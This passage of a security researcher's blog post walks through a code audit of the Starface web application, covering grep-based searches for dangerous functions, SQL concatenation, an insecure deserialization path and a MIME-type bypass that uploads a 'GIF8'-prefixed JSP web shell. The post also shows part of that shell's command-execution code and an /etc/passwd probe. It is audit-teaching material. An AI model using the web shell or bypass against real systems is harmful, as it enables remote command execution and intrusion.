+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* 151 */</span>       <span class="nc">HttpXmlRpcObjectParser</span> <span class="n">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpXmlRpcObjectParser</span><span class="o">();</span>
+<span class="cm">/*     */</span>       
+<span class="cm">/* 153 */</span>       <span class="nc">HttpXmlRpcRequest</span> <span class="n">httpRequest</span> <span class="o">=</span> <span class="o">(</span><span class="nc">HttpXmlRpcRequest</span><span class="o">)</span><span class="n">parser</span><span class="o">.</span><span class="na">parseStreamAsServer</span><span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span> <span class="c1">// &lt;-- req being a HttpServletRequest</span>
+<span class="cm">/*     */</span>       
+<span class="cm">/* 155 */</span>       <span class="nc">Object</span> <span class="n">returnValue</span> <span class="o">=</span> <span class="n">executor</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">httpRequest</span><span class="o">.</span><span class="na">getMethodName</span><span class="o">(),</span> <span class="n">httpRequest</span><span class="o">.</span><span class="na">getParameters</span><span class="o">(),</span> 
+<span class="cm">/* 156 */</span>           <span class="n">determineUrlFromCaller</span><span class="o">(</span><span class="n">req</span><span class="o">));</span>
+</code></pre></div></div>
+
+<p>We landed at <code class="language-plaintext highlighter-rouge">de.starface.com.rpc.xmlrpc.http.HttpXmlRpcObjectParser.parse(InputStream, boolean)</code>.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* 68 */</span>       <span class="nc">XmlPullParser</span> <span class="n">pullParser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MXParser</span><span class="o">();</span>
+<span class="cm">/* 69 */</span>       <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">stream</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">));</span>
+<span class="cm">/* 70 */</span>       <span class="n">pullParser</span><span class="o">.</span><span class="na">setFeature</span><span class="o">(</span><span class="s">"http://xmlpull.org/v1/doc/features.html#process-namespaces"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+<span class="cm">/* 71 */</span>       <span class="n">pullParser</span><span class="o">.</span><span class="na">setInput</span><span class="o">(</span><span class="n">reader</span><span class="o">);</span>
+<span class="cm">/*    */</span>       
+<span class="cm">/* 73 */</span>       <span class="nc">HttpXmlRpcObjectBuilder</span> <span class="n">objectBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpXmlRpcObjectBuilder</span><span class="o">();</span>
+<span class="cm">/* 74 */</span>       <span class="nc">XmlRpcObjectParser</span> <span class="n">objectParser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XmlRpcObjectParser</span><span class="o">(</span><span class="n">objectBuilder</span><span class="o">,</span> <span class="s">"query"</span><span class="o">);</span>
+<span class="cm">/*    */</span>       
+<span class="cm">/* 76 */</span>       <span class="n">objectParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">pullParser</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p>Interestingly, the <code class="language-plaintext highlighter-rouge">org.xmlpull.mxp1.MXParser</code> was totally unknown to me at this time (and somehow is still today). If you’re familiar with <strong>XXE</strong> vulnerabilities, this should activate your “vulnerability detection brain cells” (still to be discovered by neuroscientists). There was even an XML parsing feature explicitly activated programmatically: <code class="language-plaintext highlighter-rouge">setFeature("http://xmlpull.org/v1/doc/features.html#process-namespaces", true)</code>. That <em>could</em> mean that all the other dangerous parsing features wouldn’t be active and therefore not exploitable. Searching for the proper JAR file in the VM file system revealed a <code class="language-plaintext highlighter-rouge">xmlpull-1.1.3.1.jar</code>. First information on a Java library could be found on the project website or the <em>Maven Repository website</em> <a href="https://mvnrepository.com/artifact/xmlpull/xmlpull">https://mvnrepository.com/artifact/xmlpull/xmlpull</a>. Version <code class="language-plaintext highlighter-rouge">1.1.3.1</code> had a release date of 2017, another interesting indicator! No CVEs or publicly known vulnerabilities for this library were found. My recommendation would then be: <em>building a toy project</em> to play with. I didn’t do this, yet. So this might be another side project anyone could start and then blog about it (*hint*).</p>
+
+<h1 id="top-down-vs-bottom-up">Top-Down vs. Bottom-Up</h1>
+
+<p>So far, I explained finding vulnerabilities by a kind of <strong>Top-Down</strong> approach but everybody is talking about using <code class="language-plaintext highlighter-rouge">grep</code> to find the juicy stuff, right? Well, that’s also what I’m doing but I try to hold myself back until I already got a good overview on the attack surface and I definitely understand what the application is doing from a functional and technical point of view. You could have started with something like this in the beginning</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-rl</span> <span class="s1">'readObject()'</span> <span class="nt">--include</span><span class="o">=</span><span class="s1">'*.java'</span>
+</code></pre></div></div>
+
+<p>and maybe would have even found the <code class="language-plaintext highlighter-rouge">XmlReader</code> RCE. But I always suggest to not accelerate to full speed at the beginning. You will make your security code audit inefficient and also hit your frustration boundary a lot faster!</p>
+
+<p>So what are examples for the <strong>Bottom-Up</strong> approach? Basically, I constantly maintain a list of keywords for dangerous functions, objects etc. for different programming languages: command injections, SQL injections, XXE, deserialization and more.</p>
+
+<p>I’ll just give one example I used: SQL injection.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-ril</span> executeQuery | xargs <span class="nt">-I</span> <span class="o">{}</span> <span class="nb">grep</span> <span class="nt">-Li</span> preparedstatement <span class="o">{}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">executeQuery</code> is a well-known method name for executing SQL queries for various Java SQL APIs. The same is true for the <code class="language-plaintext highlighter-rouge">PreparedStatement</code> keyword: our enemy, because we don’t “want” them to use Prepared SQL Statements but rather things like good old plain string concatenation.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-ril</span> executeQuery | xargs <span class="nt">-I</span> <span class="o">{}</span> <span class="nb">grep</span> <span class="nt">-Li</span> preparedstatement <span class="o">{}</span>
+com/microsoft/sqlserver/jdbc/SQLServerBulkCopy.java
+com/microsoft/sqlserver/jdbc/SQLServerXAResource.java
+com/microsoft/sqlserver/jdbc/SQLServerStatement.java
+com/mysql/cj/jdbc/StatementWrapper.java
+com/mysql/cj/jdbc/admin/TimezoneDump.java
+com/mysql/cj/jdbc/MysqlXAConnection.java
+com/mysql/cj/jdbc/integration/c3p0/MysqlConnectionTester.java
+com/mysql/cj/jdbc/interceptors/ServerStatusDiffInterceptor.java
+de/vertico/starface/phonesetup/adapter/PattonAdapter.java
+de/vertico/starface/phonesetup/adapter/DefaultPhoneHttpAdapter.java
+de/vertico/starface/persistence/connector/StatisticsHandler.java <span class="c"># well check this</span>
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>We definitely got a long list of hits. These could have been all <em>false positives</em> but also we might had <strong>missed</strong> a lot. Why? Because if one Java source file would have contained <code class="language-plaintext highlighter-rouge">n</code> SQL execute statements with Prepared Statements and just <strong>one of them</strong> would have used string concatenation being vulnerable to SQL injection, we would have missed it. So be careful about what your <code class="language-plaintext highlighter-rouge">grep</code> command does <strong>in detail</strong>.</p>
+
+<p>Let’s have a look at <code class="language-plaintext highlighter-rouge">de.vertico.starface.persistence.connector.StatisticsHandler</code>.
+The first <code class="language-plaintext highlighter-rouge">executeQuery</code> was used in this method:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*      */</span>   <span class="kd">private</span> <span class="nc">ResultSet</span> <span class="nf">getLineUsageData</span><span class="o">(</span><span class="nc">Connection</span> <span class="n">con</span><span class="o">,</span> <span class="kt">int</span> <span class="n">accountCategory</span><span class="o">,</span> <span class="kt">long</span> <span class="n">userId</span><span class="o">,</span> <span class="kt">long</span> <span class="n">groupId</span><span class="o">,</span> <span class="kt">int</span> <span class="n">directionCategory</span><span class="o">,</span> <span class="nc">TimeRange</span> <span class="n">selectedTimeRange</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">SQLException</span> <span class="o">{</span>
+<span class="cm">/*  196 */</span>     <span class="nc">StringBuffer</span> <span class="n">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuffer</span><span class="o">();</span>
+<span class="cm">/*      */</span>     
+<span class="cm">/*  198 */</span>     <span class="n">buf</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"SELECT c.id, callid, callleguuid, calleraccountid, callercallerid, calledaccountid, calledcallerid,"</span><span class="o">);</span>
+<span class="cm">/*  199 */</span>     <span class="n">buf</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" starttime, ringingtime, linktime, callresulttime, callresult, lineid, wirename, linename,"</span><span class="o">);</span>
+<span class="cm">/*  200 */</span>     <span class="n">buf</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" incoming, answered, duration, a1.login AS callerlogin, a2.login AS calledlogin"</span><span class="o">);</span>
+<span class="cm">/*      */</span>     
+<span class="o">[...]</span>
+<span class="cm">/*  220 */</span>     <span class="n">buf</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" ORDER BY callid, starttime"</span><span class="o">);</span>
+<span class="cm">/*      */</span>     
+<span class="cm">/*  222 */</span>     <span class="nc">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
+<span class="cm">/*      */</span>     
+<span class="cm">/*  224 */</span>     <span class="n">stmt</span><span class="o">.</span><span class="na">setFetchSize</span><span class="o">(</span><span class="mi">100</span><span class="o">);</span>
+<span class="cm">/*  225 */</span>     <span class="k">return</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="n">buf</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+<span class="cm">/*      */</span>   <span class="o">}</span>
+</code></pre></div></div>
+
+<p>Well, the <code class="language-plaintext highlighter-rouge">grep</code> worked just fine but the method parameters were not used at all. Even if they’d have been used with concatenation to build the SQL string buffer, they were mainly <em>number formats</em>. I.e. you could expect something like a <code class="language-plaintext highlighter-rouge">NumberFormatException</code> before anything would have hit your SQL query execution.</p>
+
+<p>What about this method?</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*      */</span>   <span class="kd">public</span> <span class="kt">void</span> <span class="nf">deleteFromVoicemailTable</span><span class="o">(</span><span class="nc">String</span> <span class="n">voicemailListId</span><span class="o">,</span> <span class="nc">String</span> <span class="n">cdrid</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">SQLException</span> <span class="o">{</span>
+<span class="cm">/*  576 */</span>     <span class="n">con</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+<span class="cm">/*      */</span>     <span class="k">try</span> <span class="o">{</span>
+<span class="cm">/*  578 */</span>       <span class="n">con</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
+<span class="cm">/*  579 */</span>       <span class="n">con</span><span class="o">.</span><span class="na">setAutoCommit</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+<span class="cm">/*  580 */</span>       <span class="nc">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
+<span class="cm">/*  581 */</span>       <span class="k">if</span> <span class="o">(</span><span class="nc">StringUtils</span><span class="o">.</span><span class="na">isNotBlank</span><span class="o">(</span><span class="n">voicemailListId</span><span class="o">))</span> <span class="o">{</span>
+<span class="cm">/*  582 */</span>         <span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"DELETE FROM cdrvoicemail WHERE id="</span> <span class="o">+</span> <span class="n">voicemailListId</span><span class="o">;</span>
+<span class="cm">/*  583 */</span>         <span class="n">stmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
+<span class="cm">/*  584 */</span>         <span class="n">stmt</span><span class="o">.</span><span class="na">clearBatch</span><span class="o">();</span>
+<span class="cm">/*  585 */</span>         <span class="nc">String</span> <span class="n">sql1</span> <span class="o">=</span> <span class="s">"DELETE FROM cdrtovoicemail WHERE idcdrvoicemail="</span> <span class="o">+</span> <span class="n">voicemailListId</span><span class="o">;</span>
+<span class="cm">/*  586 */</span>         <span class="n">stmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">(</span><span class="n">sql1</span><span class="o">);</span>
+<span class="cm">/*  587 */</span>         <span class="n">stmt</span><span class="o">.</span><span class="na">clearBatch</span><span class="o">();</span>
+<span class="cm">/*  588 */</span>         <span class="nc">String</span> <span class="n">sql2</span> <span class="o">=</span> <span class="s">"DELETE FROM cdrsummarytovoicemail WHERE idcdrvoicemail="</span> <span class="o">+</span> <span class="n">voicemailListId</span><span class="o">;</span>
+<span class="cm">/*      */</span>         
+<span class="cm">/*  590 */</span>         <span class="n">stmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">(</span><span class="n">sql2</span><span class="o">);</span>
+<span class="o">[...]</span>
+</code></pre></div></div>
+
+<p>This looked a lot better to me, didn’t it? Now, you could use the <strong>Call Hierarchy</strong> function of Eclipse to search your way up to potentially controlled user input.</p>
+
+<p><img src="/assets/images/auditfails/sqlcallhierarchy.png" alt="Call Hierarchy" /></p>
+
+<p>I didn’t find a quick win, yet. But again feel free to hack with me together for some code audit fun purposes.</p>
+
+<p>A week later I stumbled over another idea, triggered by one of my <em>Bottom-Up</em> <code class="language-plaintext highlighter-rouge">grep</code>s: <code class="language-plaintext highlighter-rouge">readObject()</code>: <code class="language-plaintext highlighter-rouge">de/laures/cewolf/storage/FileStorage.java</code>. I instantly remembered a cool exploit by <em>mr_me</em> for <strong>ManageEngine Desktop Central</strong>. There was an insecure deserialization issue described at his <a href="https://srcincite.io/pocs/src-2020-0011.py.txt">website</a>. It used the <code class="language-plaintext highlighter-rouge">de.laures.cewolf.CewolfRenderer</code> to achieve RCE after uploading a malicious file.</p>
+
+<p>I had a look again in the <code class="language-plaintext highlighter-rouge">web.xml</code> file to check if there were any URL patterns triggering this Servlet. I found this:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;servlet&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>CewolfServlet<span class="nt">&lt;/servlet-name&gt;</span>
+		<span class="nt">&lt;servlet-class&gt;</span>de.laures.cewolf.CewolfRenderer<span class="nt">&lt;/servlet-class&gt;</span>
+		<span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
+	<span class="nt">&lt;/servlet&gt;</span>
+[...]
+	<span class="nt">&lt;servlet-mapping&gt;</span>
+		<span class="nt">&lt;servlet-name&gt;</span>CewolfServlet<span class="nt">&lt;/servlet-name&gt;</span>
+		<span class="nt">&lt;url-pattern&gt;</span>/config/statistic/statrender/*<span class="nt">&lt;/url-pattern&gt;</span>
+	<span class="nt">&lt;/servlet-mapping&gt;</span>
+</code></pre></div></div>
+
+<p>Alright, I thought, let’s be sure first that the same insecure deserialization code was available in the library used by Starface: <code class="language-plaintext highlighter-rouge">de.laures.cewolf.CewolfRenderer.doGet(HttpServletRequest, HttpServletResponse)</code>.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[...]</span>
+<span class="cm">/* 135 */</span>     <span class="nc">String</span> <span class="n">imgKey</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"img"</span><span class="o">);</span>
+<span class="cm">/* 136 */</span>     <span class="k">if</span> <span class="o">(</span><span class="n">imgKey</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+<span class="cm">/*     */</span>       
+<span class="cm">/* 138 */</span>       <span class="n">logAndRenderException</span><span class="o">(</span><span class="k">new</span> <span class="nc">ServletException</span><span class="o">(</span><span class="s">"no 'img' parameter provided for Cewolf servlet."</span><span class="o">),</span> <span class="n">response</span><span class="o">,</span> <span class="n">width</span><span class="o">,</span> <span class="n">height</span><span class="o">);</span>
+<span class="cm">/*     */</span>       <span class="k">return</span><span class="o">;</span>
+<span class="cm">/*     */</span>     <span class="o">}</span> 
+<span class="cm">/* 141 */</span>     <span class="nc">Storage</span> <span class="n">storage</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">config</span><span class="o">.</span><span class="na">getStorage</span><span class="o">();</span>
+<span class="cm">/* 142 */</span>     <span class="nc">ChartImage</span> <span class="n">chartImage</span> <span class="o">=</span> <span class="n">storage</span><span class="o">.</span><span class="na">getChartImage</span><span class="o">(</span><span class="n">imgKey</span><span class="o">,</span> <span class="n">request</span><span class="o">);</span>
+<span class="o">[...]</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">imgKey</code> we controlled, indeed. And we also found the code <code class="language-plaintext highlighter-rouge">de.laures.cewolf.storage.FileStorage.getChartImage(String, HttpServletRequest)</code>:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*     */</span>   <span class="kd">public</span> <span class="nc">ChartImage</span> <span class="nf">getChartImage</span><span class="o">(</span><span class="nc">String</span> <span class="n">id</span><span class="o">,</span> <span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+<span class="cm">/* 108 */</span>     <span class="nc">ChartImage</span> <span class="n">res</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+<span class="cm">/* 109 */</span>     <span class="nc">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+<span class="cm">/*     */</span>     <span class="k">try</span> <span class="o">{</span>
+<span class="cm">/* 111 */</span>       <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="n">getFileName</span><span class="o">(</span><span class="n">id</span><span class="o">)));</span>
+<span class="cm">/* 112 */</span>       <span class="n">res</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ChartImage</span><span class="o">)</span><span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+<span class="cm">/* 113 */</span>       <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="cm">/* 114 */</span>     <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+<span class="cm">/* 115 */</span>       <span class="n">ex</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+<span class="cm">/*     */</span>     <span class="o">}</span>
+<span class="o">[...]</span>
+</code></pre></div></div>
+
+<p>Nice! <strong>But</strong> I of course needed a upload function letting me store a malicious serialized object into a file with a specific path (or I could have controlled the path to). So I focused on the most obvious file upload: <strong>upload an avatar for my profile</strong>. Logged in as an unprivileged user <code class="language-plaintext highlighter-rouge">0002</code> again, I searched and found the profile function quickly.</p>
+
+<p><img src="/assets/images/auditfails/profileUI.png" alt="Profile UI" /></p>
+
+<p>I started with a valid image borrowed from my favorite fake profile contributor <a href="https://thispersondoesnotexist.com/">https://thispersondoesnotexist.com/</a>. I observed a POST request to <code class="language-plaintext highlighter-rouge">http://192.168.2.103/frontend/preferences/display/data/avatar/upload.do?token=[...]</code> with <strong>multipart/form-data</strong>.</p>
+
+<p><img src="/assets/images/auditfails/profilemultiform.png" alt="Profile Multi Form" /></p>
+
+<p>Interestingly, the response contained a download link for the image as well</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;table</span> <span class="na">style=</span><span class="s">"background-image: url('/download/starface1604513874694340454.jpeg?key=Su2UMZiXNl3Koo6swU487M7q6CN6gP');"</span>
+</code></pre></div></div>
+
+<p>and guess what: the same file name was found on the VM’s file system at <code class="language-plaintext highlighter-rouge">/var/cache/tomcat/temp/starface1604513874694340454.jpeg</code>. So from the response we could tell where a file landed and what it’s name would be. Exactly what we needed. But we were not there, yet. We wanted to upload something malicious, right?</p>
+
+<p>We started with something obvious, a <strong>JSP file</strong> but all we got was an error:
+<code class="language-plaintext highlighter-rouge">File has wrong MIME type, must be one of image/png, image/jpeg, image/gif</code>.
+But a new file was created at <code class="language-plaintext highlighter-rouge">/var/cache/tomcat/temp/starface7442021089817434947.jsp</code> with the JSP code content. Unfortunately, we didn’t get the <em>download link</em> in the response if an error occurred. But I was on fire, motivation high, so I thought: <strong>let’s bypass this MIME type check</strong>.</p>
+
+<p>I drilled down the code starting from the Struts action until I hit <code class="language-plaintext highlighter-rouge">de.vertico.starface.helpers.FileUploadCheck.checkMimeType()</code>.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*     */</span>   <span class="kt">void</span> <span class="nf">checkMimeType</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">FileUploadCheckException</span> <span class="o">{</span>
+<span class="cm">/* 270 */</span>     <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">mimeTypes</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+<span class="cm">/*     */</span>       <span class="k">return</span><span class="o">;</span>
+<span class="cm">/*     */</span>     <span class="o">}</span>
+<span class="cm">/*     */</span> 
+<span class="cm">/*     */</span>     
+<span class="cm">/*     */</span>     <span class="k">try</span> <span class="o">{</span>
+<span class="cm">/* 276 */</span>       <span class="nc">ContentInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">magicUtil</span><span class="o">.</span><span class="na">findMatch</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">file</span><span class="o">);</span>
+<span class="cm">/*     */</span> 
+<span class="cm">/*     */</span>       
+<span class="cm">/* 279 */</span>       <span class="k">if</span> <span class="o">(</span><span class="n">info</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="k">this</span><span class="o">.</span><span class="na">mimeTypes</span><span class="o">.</span><span class="na">stream</span><span class="o">().</span><span class="na">noneMatch</span><span class="o">(</span><span class="n">s</span> <span class="o">-&gt;</span> <span class="n">info</span><span class="o">.</span><span class="na">getMimeType</span><span class="o">().</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">s</span><span class="o">)))</span> <span class="o">{</span>
+<span class="cm">/* 280 */</span>         <span class="k">throw</span> <span class="k">new</span> <span class="nc">FileUploadCheckException</span><span class="o">(</span><span class="s">"jsp.error.upload.wrong.mime.type"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="s">", "</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">mimeTypes</span><span class="o">));</span>
+<span class="cm">/*     */</span>       <span class="o">}</span>
+<span class="o">[...]</span>
+</code></pre></div></div>
+
+<p>I then followed the call to <code class="language-plaintext highlighter-rouge">com.j256.simplemagic.ContentInfoUtil.findMatch(File)</code> and you might have realized already that the <strong>namespace changed</strong>. We hit another library code, no Starface code anymore. Searching at the VM’s file system revealed the JAR file of the library located at <code class="language-plaintext highlighter-rouge">webapps/starface/WEB-INF/lib/simplemagic-1.16.jar</code>.</p>
+
+<p>The input for the MIME type definitions came from a file <code class="language-plaintext highlighter-rouge">magic.gz</code> in the library’s JAR itself. This file was well-structured for every type based on magic bytes and partially subsequent bytes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0       string          SIMPLE\x20\x20= FITS data
+!:mime  application/fits
+[...]
+</code></pre></div></div>
+
+<p>Knowing which image file types were accepted in Starface, I could focus on the <code class="language-plaintext highlighter-rouge">magic.gz</code> byte definitions for those. Another principle I try to follow: always try the simpliest things first. Some MIME type definitions included complex byte structure checks, some others didn’t. What I got was this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+0	string		GIF8		GIF image data
+!:mime	image/gif
+[...]
+</code></pre></div></div>
+
+<p>The comparisons began at the very first byte of our input stream and checked the first four bytes being equal to <code class="language-plaintext highlighter-rouge">GIF8</code>. And indeed, I was able to upload JSP code, even preserving the file extension, with something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8&lt;%@ page import="java.util.*,java.io.*"%&gt;
+&lt;%
+%&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+Commands with JSP
+&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;
+&lt;INPUT TYPE="text" NAME="cmd"&gt;
+&lt;INPUT TYPE="submit" VALUE="Send"&gt;
+&lt;/FORM&gt;
+&lt;pre&gt;
+&lt;%
+if (request.getParameter("cmd") != null) {
+    out.println("Command: " + request.getParameter("cmd") + "&lt;BR&gt;");
+
+    Process p;
+    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
+        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
+[...]
+</code></pre></div></div>
+
+<p>I even tried to copy this file into the <strong>Tomcat ROOT directory</strong> manually and was surprised that Tomcat happily served this file as JSP despite the <code class="language-plaintext highlighter-rouge">GIF8</code> prefix. We learnt something new!</p>
+
+<p>Current status:</p>
+
+<ol>
+  <li>We could upload a malicious file thanks to a MIME type check bypass.</li>
+  <li>We didn’t have to hold a special permission but any authenticated user.</li>
+  <li>We knew the file name and location on the file system.</li>
+</ol>
+
+<p>We didn’t test this with a serialized object instead of a JSP file but wanted to check the <code class="language-plaintext highlighter-rouge">CewolfServlet</code> call first.</p>
+
+<p>We made a request to <code class="language-plaintext highlighter-rouge">http://192.168.2.103/config/statistic/statrender?img=/etc/passwd</code> and <strong>hit the breakpoint</strong></p>
+
+<p><img src="/assets/images/auditfails/cewolfhit.png" alt="CeWolf Hit" /></p>
+
+<p>with our desired parameter</p>
+
+<p><img src="/assets/images/auditfails/cewolfparam.png" alt="CeWolf Param" /></p>
+
+<p>and <strong>failed</strong></p>
+
+<p><img src="/assets/images/auditfails/cewolffail.png" alt="CeWolf Fail" /></p>
+
+<p>(…twice if you check the processing of <code class="language-plaintext highlighter-rouge">imgKey</code> more closely).</p>
+
+<p>No <code class="language-plaintext highlighter-rouge">de.laures.cewolf.storage.FileStorage</code> object here but <code class="language-plaintext highlighter-rouge">de.laures.cewolf.storage.TransientSessionStorage</code>. Guess what? No <code class="language-plaintext highlighter-rouge">readObject()</code> anymore.</p>
+
+<p><strong>Conclusion of this journey</strong>:</p>
+<ol>
+  <li>We managed to find a dangerous file upload.</li>
+  <li>We failed to chain it with a previously known deserialization issue of a library.</li>
+</ol>
+
+<h1 id="more-fails">More Fails</h1>
+
+<p>You’re looking for more fails? Look at <code class="language-plaintext highlighter-rouge">struts.xml</code> again and draw your own conclusions.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+	<span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">"struts.additional.excludedPatterns"</span> <span class="na">value=</span><span class="s">"^(action|method):.*"</span> <span class="nt">/&gt;</span>
+	<span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">"struts.enable.DynamicMethodInvocation"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+	<span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">"struts.devMode"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
+[...]
+</code></pre></div></div>
+
+<h1 id="last-words">Last Words</h1>
+
+<p>This blog post already became a bit too long so I stop here with my fail compilation. I hope you learnt something about the methods I use, common pitfalls and some inspiration for a proper mindset on security code auditing.</p>
+
+  </div><a class="u-url" href="/vulns4free/2022/05/24/security-code-audit-fails.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Frycos Security Diary</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Frycos Security Diary</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/frycos"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">frycos</span></a></li><li><a href="https://www.twitter.com/frycos"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">frycos</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Blogging mainly</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
